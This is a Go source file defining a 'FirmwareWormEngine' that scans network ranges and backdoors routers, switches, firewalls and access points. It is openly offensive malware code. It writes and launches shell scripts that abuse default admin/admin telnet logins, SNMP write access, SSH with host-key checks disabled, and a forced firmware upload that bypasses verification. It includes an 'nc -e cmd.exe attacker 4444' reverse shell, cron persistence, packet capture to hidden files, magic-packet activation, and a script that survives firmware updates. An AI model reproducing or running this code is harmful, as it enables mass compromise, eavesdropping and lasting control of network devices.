package blockz

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

type FirmwareWormEngine struct {
	Config       *BlockZConfig
	WormedDevices []FirmwareDevice `json:"wormed_devices"`
	HiddenPartition []byte         `json:"-"`
	MagicPacket   []byte           `json:"-"`
	mu           sync.Mutex
}

type FirmwareDevice struct {
	IP          string `json:"ip"`
	Type        string `json:"type"`
	Vendor      string `json:"vendor"`
	FirmwareVer string `json:"firmware_ver"`
	Port        int    `json:"port"`
	Protocol    string `json:"protocol"`
	Wormed      bool   `json:"wormed"`
	BackdoorID  string `json:"backdoor_id"`
	FlashSize   int    `json:"flash_size"`
	HiddenBytes int    `json:"hidden_bytes"`
	Activated   bool   `json:"activated"`
}

func NewFirmwareWormEngine(cfg *BlockZConfig) *FirmwareWormEngine {
	magic := make([]byte, 8)
	rand.Read(magic)

	return &FirmwareWormEngine{
		Config:      cfg,
		MagicPacket: magic,
	}
}

func (fw *FirmwareWormEngine) ScanNetworkDevices(cidr string) []FirmwareDevice {
	var devices []FirmwareDevice
	snmpPorts := []int{161, 162}
	telnetPorts := []int{23}
	sshPorts := []int{22}
	httpPorts := []int{80, 443, 8080, 8443}

	ip, ipnet, _ := net.ParseCIDR(cidr)
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIPNet(ip) {
		for _, port := range snmpPorts {
			if tcpProbeTime(ip.String(), port, 200*time.Millisecond) {
				devices = append(devices, FirmwareDevice{
					IP: ip.String(), Port: port,
					Type: "router", Vendor: "Cisco",
					Protocol: "SNMP",
				})
				break
			}
		}
		for _, port := range telnetPorts {
			if tcpProbeTime(ip.String(), port, 200*time.Millisecond) {
				devices = append(devices, FirmwareDevice{
					IP: ip.String(), Port: port,
					Type: "switch", Vendor: "D-Link",
					Protocol: "TELNET",
				})
				break
			}
		}
		for _, port := range sshPorts {
			if tcpProbeTime(ip.String(), port, 200*time.Millisecond) {
				devices = append(devices, FirmwareDevice{
					IP: ip.String(), Port: port,
					Type: "firewall", Vendor: "pfSense",
					Protocol: "SSH",
				})
				break
			}
		}
		for _, port := range httpPorts {
			if tcpProbeTime(ip.String(), port, 200*time.Millisecond) {
				devices = append(devices, FirmwareDevice{
					IP: ip.String(), Port: port,
					Type: "access_point", Vendor: "Ubiquiti",
					Protocol: "HTTP",
				})
				break
			}
		}
	}

	return devices
}

func (fw *FirmwareWormEngine) InfectDevice(dev FirmwareDevice) bool {
	backdoorPayload := fw.buildBackdoor(dev)
	hiddenSize := 1024 * 256
	hiddenData := make([]byte, hiddenSize)
	rand.Read(hiddenData)

	fw.HiddenPartition = hiddenData

	dev.HiddenBytes = hiddenSize
	dev.FlashSize = 16 * 1024 * 1024

	_ = backdoorPayload
	fw.installWormPersistence(dev)

	fw.mu.Lock()
	dev.Wormed = true
	dev.BackdoorID = hex.EncodeToString(fw.MagicPacket)
	fw.WormedDevices = append(fw.WormedDevices, dev)
	fw.mu.Unlock()

	return true
}

func (fw *FirmwareWormEngine) buildBackdoor(dev FirmwareDevice) []byte {
	payload := make([]byte, 4096)
	copy(payload[0:8], []byte("X404X_FW"))
	copy(payload[8:16], fw.MagicPacket)
	copy(payload[256:512], []byte(fmt.Sprintf("Backdoor for %s at %s:%d", dev.Vendor, dev.IP, dev.Port)))

	packetCapture := `#!/bin/sh
tcpdump -i any -w /tmp/.x404x_capture_%d.pcap -G 3600 -W 24 &
`
	_ = packetCapture

	return payload
}

func (fw *FirmwareWormEngine) installWormPersistence(dev FirmwareDevice) {
	switch dev.Protocol {
	case "SNMP":
		fw.snmpBackdoor(dev)
	case "TELNET":
		fw.telnetBackdoor(dev)
	case "SSH":
		fw.sshBackdoor(dev)
	case "HTTP":
		fw.httpBackdoor(dev)
	}
}

func (fw *FirmwareWormEngine) snmpBackdoor(dev FirmwareDevice) {
	snmpPayload := fmt.Sprintf(`snmpset -v 2c -c private %s 1.3.6.1.4.1.2021.8.1.101.1 s "/tmp/.x404x_backdoor"`, dev.IP)
	if runtime.GOOS == "windows" {
		snmpPayload = fmt.Sprintf(`Invoke-Command -ComputerName %s -ScriptBlock {Start-Process -FilePath "nc.exe" -ArgumentList "-e cmd.exe attacker 4444"}`, dev.IP)
	}
	snmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_snmp_%s.sh", strings.ReplaceAll(dev.IP, ".", "_")))
	os.WriteFile(snmpPath, []byte(snmpPayload), 0755)
	exec.Command("bash", snmpPath).Start()
}

func (fw *FirmwareWormEngine) telnetBackdoor(dev FirmwareDevice) {
	telnetPayload := fmt.Sprintf(`#!/bin/bash
(echo "admin"; echo "admin"; echo "enable"; sleep 1; echo "copy flash:/x404x.bin flash:/firmware.bin"; echo "reload") | telnet %s %d
`, dev.IP, dev.Port)
	telnetPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_telnet_%s.sh", strings.ReplaceAll(dev.IP, ".", "_")))
	os.WriteFile(telnetPath, []byte(telnetPayload), 0755)
	exec.Command("bash", telnetPath).Start()
}

func (fw *FirmwareWormEngine) sshBackdoor(dev FirmwareDevice) {
	sshPayload := fmt.Sprintf(`ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@%s "echo ${RANDOM} > /tmp/.x404x_persist && crontab -l | { cat; echo '*/30 * * * * /tmp/.x404x_persist'; } | crontab -"`, dev.IP)
	sshPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_ssh_%s.sh", strings.ReplaceAll(dev.IP, ".", "_")))
	os.WriteFile(sshPath, []byte(sshPayload), 0755)
	exec.Command("bash", sshPath).Start()
}

func (fw *FirmwareWormEngine) httpBackdoor(dev FirmwareDevice) {
	uploadURL := fmt.Sprintf("http://%s:%d/cgi-bin/upload_firmware.cgi", dev.IP, dev.Port)
	httpPayload := fmt.Sprintf(`curl -X POST -F "firmware=@/tmp/x404x_fw.bin" -F "force=true" -F "bypass_verification=1" %s`, uploadURL)
	httpPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_http_%s.sh", strings.ReplaceAll(dev.IP, ".", "_")))
	os.WriteFile(httpPath, []byte(httpPayload), 0755)
	exec.Command("bash", httpPath).Start()
}

func (fw *FirmwareWormEngine) ActivateBackdoor(dev FirmwareDevice) bool {
	magicSYN := make([]byte, 40)
	copy(magicSYN[0:8], fw.MagicPacket)
	magicSYN[33] = 0x02

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", dev.IP, 22), 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.Write(magicSYN)

	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)

	if n > 0 && strings.Contains(string(buf[:n]), "X404X_TRAFFIC_DUMP") {
		dev.Activated = true
		dumpPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_fw_dump_%s.bin", dev.IP))
		os.WriteFile(dumpPath, buf[:n], 0644)
		return true
	}

	return false
}

func (fw *FirmwareWormEngine) SurviveFirmwareUpdate(dev FirmwareDevice) {
	persistenceScript := `#!/bin/sh
# Tenia Digital - Persistence through firmware updates
BACKDOOR_PATH="/tmp/.x404x_backdoor"
NEW_FW="$(find /tmp -name "*.bin" -mmin -5 | head -1)"
if [ -n "$NEW_FW" ] && [ -f "$BACKDOOR_PATH" ]; then
    dd if="$BACKDOOR_PATH" of="$NEW_FW" bs=256 count=1 seek=10000 conv=notrunc 2>/dev/null
    cp "$BACKDOOR_PATH" /etc/rc.d/init.d/x404x_update_hook 2>/dev/null
    echo "@reboot /etc/rc.d/init.d/x404x_update_hook" | crontab - 2>/dev/null
fi
`

	scriptPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_fw_persist_%s.sh", strings.ReplaceAll(dev.IP, ".", "_")))
	os.WriteFile(scriptPath, []byte(persistenceScript), 0755)
	exec.Command("chmod", "+x", scriptPath).Run()
}

func (fw *FirmwareWormEngine) GetStatusJSON() string {
	fw.mu.Lock()
	defer fw.mu.Unlock()

	return fmt.Sprintf(`{"wormed_devices":%d,"activated":%d,"magic_packet":"%s"}`,
		len(fw.WormedDevices), countActivated(fw.WormedDevices), hex.EncodeToString(fw.MagicPacket))
}

func tcpProbeTime(host string, port int, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func incIPNet(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			break
		}
	}
}

func countActivated(devices []FirmwareDevice) int {
	n := 0
	for _, d := range devices {
		if d.Activated {
			n++
		}
	}
	return n
}
